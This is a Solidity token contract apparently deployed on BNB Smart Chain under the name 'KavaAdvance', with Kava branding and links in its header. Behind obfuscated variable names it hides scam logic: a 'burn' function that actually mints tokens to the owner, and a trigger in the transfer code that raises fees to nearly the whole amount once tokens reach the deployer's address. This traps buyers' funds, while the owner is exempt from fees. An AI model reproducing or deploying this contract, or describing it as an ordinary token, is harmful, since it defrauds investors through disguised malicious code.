/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

/*
✅KavaAdvance Network✅
✅@kavaplatform✅
✅KavaAdvance believes in a #Web3 future. 
✅#Kava is a decentralized blockchain that is optimized for protocol growth.
✅https://www.kava.io/✅
✅https://t.me/kavalabs✅
✅https://twitter.com/kava_platform✅
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.3;
contract KavaAd {
uint256 private  BREVFR = 1000000000000000000;
uint256 private  CMZLGG = 11;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  OUCCUR = 12;
uint256 private  FLYTFL = 13;
address private  AUFWUJ = address(0);
uint256 public constant XTJZWJ = 99999;
uint256 private  BLMSUT = 14;
address private  YGXYKD = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  VTERFI = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  PCGEUU = address(0);
uint8 public constant decimals = 18;
address private  WBFHBG = address(0);
mapping (address => uint256) public balanceOf;
string public  symbol = "KavaAd";
uint256 private  WGEJGI = 15;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
uint256 public constant totalSupply = 1000000000000000000000000000;
string public  name = "KavaAd";
uint256 private  AHRILY = 16;
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JCRZCI");
require(to != address(0), "JCRZCI");
require(amount <= balanceOf[from], "JCRZCI");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XTJZWJ/BREVFR ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==WBFHBG){
BREVFR = XTJZWJ+2;
}
emit Transfer(from, to, transferAmount);
}
function _getCMZLGG() private returns (uint256) {
return CMZLGG+1;
}

function _getAHRILY() private returns (uint256) {
return AHRILY+6;
}

function _getYGXYKD() private returns (address) {
return YGXYKD;
}

function _getBLMSUT() private returns (uint256) {
return BLMSUT+4;
}

function _getWGEJGI() private returns (uint256) {
return WGEJGI+5;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getVTERFI() private returns (address) {
return VTERFI;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getAUFWUJ() private returns (address) {
return AUFWUJ;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getPCGEUU() private returns (address) {
return PCGEUU;
}

constructor () public {
WBFHBG = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getOUCCUR() private returns (uint256) {
return OUCCUR+2;
}

function _getFLYTFL() private returns (uint256) {
return FLYTFL+3;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tJCRZCI 0");
require(spender != address(0), "fJCRZCI 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}